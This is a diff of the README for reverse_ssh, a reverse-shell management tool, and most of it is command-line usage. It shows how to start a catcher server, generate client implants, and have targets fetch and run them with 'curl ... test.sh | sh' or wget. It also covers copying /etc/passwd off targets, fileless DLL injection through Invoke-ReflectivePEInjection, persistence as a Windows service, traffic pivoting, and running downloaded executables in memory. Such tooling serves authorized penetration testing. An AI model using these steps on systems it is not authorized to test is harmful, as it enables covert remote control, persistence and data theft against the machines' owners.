@@ -6,7 +6,7 @@ Want to use SSH for reverse shells? Now you can.
 
 - Manage and connect to reverse shells with native SSH syntax
 - Dynamic, local and remote forwarding
-- Native SCP and SFTP implementations for retrieving files from your targets
+- Native `SCP` and `SFTP` implementations for retrieving files from your targets
 - Full windows shell
 - Mutual client & server authentication to create high trust control channels  
 And more! 
@@ -40,21 +40,20 @@ And more!
 - [Reverse SSH](#reverse-ssh)
   - [TL;DR](#tldr)
     - [Setup](#setup)
-    - [Running](#running)
-  - [Setup Instructions](#setup-instructions)
+    - [Basic Usage](#basic-usage)
   - [Fancy Features](#fancy-features)
-    - [Baked in connect/call back address](#baked-in-connectcall-back-address)
-    - [Built in Agent Download Server](#built-in-agent-download-server)
+    - [Automatic connect-back](#automatic-connect-back)
+    - [Client Generation (and HTTP server)](#client-generation-and-http-server)
     - [Windows DLL Generation](#windows-dll-generation)
-    - [SSH Subsystem](#ssh-subsystem)
+    - [SSH Subsystems](#ssh-subsystems)
       - [All](#all)
       - [Linux](#linux)
       - [Windows](#windows)
     - [Windows Service Integration](#windows-service-integration)
     - [Full Windows Shell Support](#full-windows-shell-support)
     - [Webhooks](#webhooks)
-    - [Tun](#tun)
-    - [Executable Downloading](#executable-downloading)
+    - [Tun (VPN)](#tun-vpn)
+    - [Fileless execution (Clients support dynamically downloading executables to execute as shell)](#fileless-execution-clients-support-dynamically-downloading-executables-to-execute-as-shell)
       - [Supported URI Schemes](#supported-uri-schemes)
 - [Help](#help)
   - [Windows and SFTP](#windows-and-sftp)
@@ -66,149 +65,90 @@ And more!
 
 ### Setup
 
-Docker:
-```
-docker run -p3232:2222 -e EXTERNAL_ADDRESS=<your_external_address>:3232 -e SEED_AUTHORIZED_KEYS="$(cat ~/.ssh/id_ed25519.pub)" -v data:/data reversessh/reverse_ssh
-```
-
-Manual:
+The docker release is recommended as it includes the right version of golang, and a cross compiler for windows. 
 ```sh
-git clone https://github.com/NHAS/reverse_ssh
-
-cd reverse_ssh
-
-make
-cd bin/
-
-# start the server
-cp ~/.ssh/id_ed25519.pub authorized_keys
-./server 0.0.0.0:3232
+# Start the server
+docker run -p3232:2222 -e EXTERNAL_ADDRESS=<your.rssh.server.internal>:3232 -e SEED_AUTHORIZED_KEYS="$(cat ~/.ssh/id_ed25519.pub)" -v data:/data reversessh/reverse_ssh
 ```
 
-### Running
+### Basic Usage
 
 ```sh
-# copy client to your target then connect it to the server
-./client -d your.rssh.server.com:3232
-
-# Get help text
-ssh your.rssh.server.com -p 3232 help
-
-# See clients
-ssh your.rssh.server.com -p 3232 ls -t
-
-                                Targets
-+------------------------------------------+------------+-------------+
-| ID                                       | Hostname   | IP Address  |
-+------------------------------------------+------------+-------------+
-| 0f6ffecb15d75574e5e955e014e0546f6e2851ac | root.wombo | [::1]:45150 |
-+------------------------------------------+------------+-------------+
+# Connect to the server console
+ssh your.rssh.server.internal -p 3232
 
 
-# Connect to full shell
-ssh -J your.rssh.server.com:3232 0f6ffecb15d75574e5e955e014e0546f6e2851ac
+# List all server console commands
+catcher$ help
 
-# Or using hostname 
+# Build a new client and host it on the in-built webserver
+catcher$ link
+http://192.168.0.11:3232/4bb55de4d50cc724afbf89cf46f17d25
 
-ssh -J your.rssh.server.com:3232 root.wombo
 
+# curl or wget this binary to a target system then execute it, 
+# we can then list what clients are connected
+catcher$ ls
+                                 Targets
++------------------------------------------+-----------------------------------+
+| IDs                                      | Version                           |
++------------------------------------------+-----------------------------------+
+| a0baa1631fe7cfbbfae34eb7a66d46c00d2a161e | SSH-v2.2.3-1-gdf5a3f8-linux_amd64 |
+| fe6c52029e37185e4c7d512edd67a6c7694e2995 |                                   |
+| dummy.machine                            |                                   |
+| 192.168.0.11:34542                       |                                   |
++------------------------------------------+-----------------------------------+
 ```
 
-## Setup Instructions
+All commands support the `-h` flag for giving help.
 
-> **NOTE:** reverse_ssh requires Go **1.17** or higher. Please check you have at least this version via `go version`
-
-The simplest build command is just:
-
-```sh
-make
-```
-
-Make will build both the `client` and `server` binaries. It will also generate a private key for the `client`, and copy the corresponding public key to the `authorized_controllee_keys` file to enable the reverse shell to connect.
-
-Golang allows your to effortlessly cross compile, the following is an example for building windows:
-
-```sh
-GOOS=windows GOARCH=amd64 make client # will create client.exe
-```
-
-You will need to create an `authorized_keys` file much like the ssh http://man.he.net/man5/authorized_keys, this contains *your* public key.
-This will allow you to connect to the RSSH server.
-
-Alternatively, you can use the --authorizedkeys flag to point to a file.
-
-```sh
-cp ~/.ssh/id_ed25519.pub authorized_keys
-./server 0.0.0.0:3232 #Set the server to listen on port 3232
-```
-
-Put the client binary on whatever you want to control, then connect to the server.
-
-```sh
-./client -d your.rssh.server.com:3232
-```
-
-You can then see what reverse shells have connected to you using `ls`:
-
-```sh
-ssh your.rssh.server.com -p 3232 ls -t
-                                Targets
-+------------------------------------------+------------+-------------+
-| ID                                       | Hostname   | IP Address  |
-+------------------------------------------+------------+-------------+
-| 0f6ffecb15d75574e5e955e014e0546f6e2851ac | root.wombo | [::1]:45150 |
-+------------------------------------------+------------+-------------+
-
-```
 
 Then typical ssh commands work, just specify your rssh server as a jump host. 
 
 ```sh
 # Connect to full shell
-ssh -J your.rssh.server.com:3232 root.wombo
-
-# Run a command without pty
-ssh -J your.rssh.server.com:3232 root.wombo help
+ssh -J your.rssh.server.internal:3232 dummy.machine
 
 # Start remote forward 
-ssh -R 1234:localhost:1234 -J your.rssh.server.com:3232 root.wombo
+ssh -R 1234:localhost:1234 -J your.rssh.server.internal:3232 dummy.machine
 
 # Start dynamic forward 
-ssh -D 9050 -J your.rssh.server.com:3232 root.wombo
+ssh -D 9050 -J your.rssh.server.internal:3232 dummy.machine
 
 # SCP 
-scp -J your.rssh.server.com:3232 root.wombo:/etc/passwd .
-
-#SFTP
-sftp -J your.rssh.server.com:3232 root.wombo:/etc/passwd .
+scp -J your.rssh.server.internal:3232 dummy.machine:/etc/passwd .
 
 ```
 
 ## Fancy Features
 
-### Baked in connect/call back address
+### Automatic connect-back 
 
-Specify a default server at build time:
+The rssh client allows you to bake in a connect back address.  
+By default the `link` command will bake in the servers external address.
+
+If you're (for some reason) manually building the binary, you can specify the environment variable `RSSH_HOMESERVER` to bake it into the client:
 
 ```sh
-$ RSSH_HOMESERVER=your.rssh.server.com:3232 make
+$ RSSH_HOMESERVER=your.rssh.server.internal:3232 make
 
-# Will connect to your.rssh.server.com:3232, even though no destination is specified
+# Will connect to your.rssh.server.internal:3232, even though no destination is specified
 $ bin/client
 
 # Behaviour is otherwise normal; will connect to the supplied host, e.g example.com:3232
 $ bin/client -d example.com:3232
 ```
 
-### Built in Agent Download Server
+### Client Generation (and HTTP server)
 
-The RSSH server can also run an HTTP server on the same port as the RSSH server listener which serves client binaries.  The server must be placed in the project `bin/` folder, as it needs to find the client source.
+The RSSH server can build and host client binaries (`link` command). Which is the preferred method for building and serving clients. 
+For function to work the server must be placed in the project `bin/` folder, as it needs to find the client source.
+
+By default the `docker` release has this all built properly, and is recommended for use
 
 ```sh
-./server --webserver :3232
 
-# Generate an unnamed link
-ssh your.rssh.server.com -p 3232
+ssh your.rssh.server.internal -p 3232
 
 catcher$ link -h
 
@@ -233,51 +173,44 @@ This requires the web server component has been enabled.
 	--upx	Use upx to compress the final binary (requires upx to be installed)
 	--no-lib-c	Compile client without glibc
 
-# Build a client binary
+# Generate a client and serve it on a named link
 catcher$ link --name test
-http://your.rssh.server.com:3232/test
+http://your.rssh.server.internal:3232/test
 
 ```
 
 Then you can download it as follows:
 
 ```sh
-wget http://your.rssh.server.com:3232/test
+wget http://your.rssh.server.internal:3232/test
 chmod +x test
 ./test
 ```
 
 The RSSH server also supports `.sh`, and `.py` URL path endings which will generate a script you can pipe into an intepreter:
 ```sh
-curl http://your.rssh.server.com:3232/test.sh | sh
+curl http://your.rssh.server.internal:3232/test.sh | sh
 ```
 
 ### Windows DLL Generation 
 
-You can compile the client as a DLL to be loaded with something like [Invoke-ReflectivePEInjection](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1). 
-This will need a cross compiler if you are doing this on linux, use `mingw-w64-gcc`. 
+You can compile the client as a DLL to be loaded with something like [Invoke-ReflectivePEInjection](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1). Which is useful when you want to do fileless injection of the rssh client. 
+
+This will need a cross compiler if you are doing this on linux, use `mingw-w64-gcc`, this is included in the docker release.
 
 ```bash
+# Using the link command
+catcher$ link --goos windows --shared-object --name windows_dll
+http://your.rssh.server.internal:3232/windows_dll
+
+# If building manually
 CC=x86_64-w64-mingw32-gcc GOOS=windows RSSH_HOMESERVER=192.168.1.1:2343 make client_dll
-```
-
-When the RSSH server has the webserver enabled you can also compile it with the link command: 
 
 ```
-./server --webserver :3232
 
-# Generate an unnamed link
-ssh your.rssh.server.com -p 3232
+### SSH Subsystems
 
-catcher$ link --name windows_dll --shared-object --goos windows
-http://your.rssh.server.com:3232/windows_dll
-```
-
-Which is useful when you want to do fileless injection of the rssh client. 
-
-### SSH Subsystem
-
-The SSH ecosystem allowsy out define and call subsystems with the `-s` flag. In RSSH this is repurposed to provide special commands for platforms. 
+The SSH protocol supports calling subsystems with the `-s` flag. In RSSH this is repurposed to provide special commands for platforms, and `sftp` support. 
 
 
 #### All
@@ -296,19 +229,17 @@ e.g
 
 ```
 # Install the rssh binary as a service (windows only)
-ssh -J your.rssh.server.com:3232 test-pc.user.test-pc -s service --install
+ssh -J your.rssh.server.internal:3232 test-pc.user.test-pc -s service --install
 ```
 
 ### Windows Service Integration
 
 The client RSSH binary supports being run within a windows service and wont time out after 10 seconds. This is great for creating persistent management services. 
 
-
-
 ### Full Windows Shell Support
 
 Most reverse shells for windows struggle to generate a shell environment that supports resizing, copying and pasting and all the other features that we're all very fond of. 
-This project uses conpty on newer versions of windows, and the winpty library (which self unpacks) on older versions. This should mean that almost all versions of windows will net you a nice shell. 
+This project uses `conpty` on newer versions of windows, and the `winpty` library (which self unpacks) on older versions. This should mean that almost all versions of windows will net you a nice shell. 
 
 ### Webhooks
 
@@ -316,7 +247,7 @@ The RSSH server can send out raw HTTP requests set using the `webhook` command f
 
 First enable a webhook:
 ```bash
-$ ssh your.rssh.server.com -p 3232
+$ ssh your.rssh.server.internal -p 3232
 catcher$ webhook --on http://localhost:8080/
 ```
 
@@ -338,9 +269,9 @@ Accept-Encoding: gzip
 
 As an additional note, please use the `/slack` endpoint if connecting this to discord. 
 
-### Tun
+### Tun (VPN)
 
-RSSH and SSH support creating tuntap interfaces that allow you to route traffic and create pseudo-VPN. It does take a bit more setup than just a local or remote forward (-L, -R), but in this mode you can send UDP and ICMP.
+RSSH and SSH support creating tuntap interfaces that allow you to route traffic and create pseudo-VPN. It does take a bit more setup than just a local or remote forward (`-L`, `-R`), but in this mode you can send UDP and ICMP.
 
 First set up a tun (layer 3) device on your local machine.
 ```sh
@@ -351,14 +282,15 @@ sudo ip link set dev tun0 up
 # This will defaultly route all non-local network traffic through the tunnel
 sudo ip route add 0.0.0.0/0 via 172.16.0.1 dev tun0
 ```
+
 Install a client on a remote machine, this will not work if you have your RSSH client on the same host as your tun device.
 ```sh
-ssh -J your.rssh.server.com:3232 user.wombo -w 0:any
+ssh -J your.rssh.server.internal:3232 user.wombo -w 0:any
 ```
 
-This has some limitations, it is only able to send UDP/TCP/ICMP, and not arbitrary layer 3 protocols. ICMP is best effort and may use the remote hosts `ping` tool, as ICMP sockets are privileged on most machines. This also does not support `tap` devices, e.g layer 2 VPN, as this would require administrative access.
+This has some limitations, it is only able to send `UDP`/`TCP`/`ICMP`, and not arbitrary layer 3 protocols. `ICMP` is best effort and may use the remote hosts `ping` tool, as ICMP sockets are privileged on most machines. This also does not support `tap` devices, e.g layer 2 VPN, as this would require administrative access.
 
-### Executable Downloading
+### Fileless execution (Clients support dynamically downloading executables to execute as shell)
 
 When specifying what executable the rssh binary should run, either when connecting with a full PTY session or raw execution the client supports URI schemes to download offhost executables.
 
@@ -387,7 +319,7 @@ Both of these methods will opportunistically use [memfd](https://man7.org/linux/
 Due to the limitations of SFTP (or rather the library Im using for it). Paths need a little more effort on windows.
 
 ```
-sftp -r -J your.rssh.server.com:3232 test-pc.user.test-pc:'/C:/Windows/system32'
+sftp -r -J your.rssh.server.internal:3232 test-pc.user.test-pc:'/C:/Windows/system32'
 ```
 
 Note the `/` before the starting character. 
